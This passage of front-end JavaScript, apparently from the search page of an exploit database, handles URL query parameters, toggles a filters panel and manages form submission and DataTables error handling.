(pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
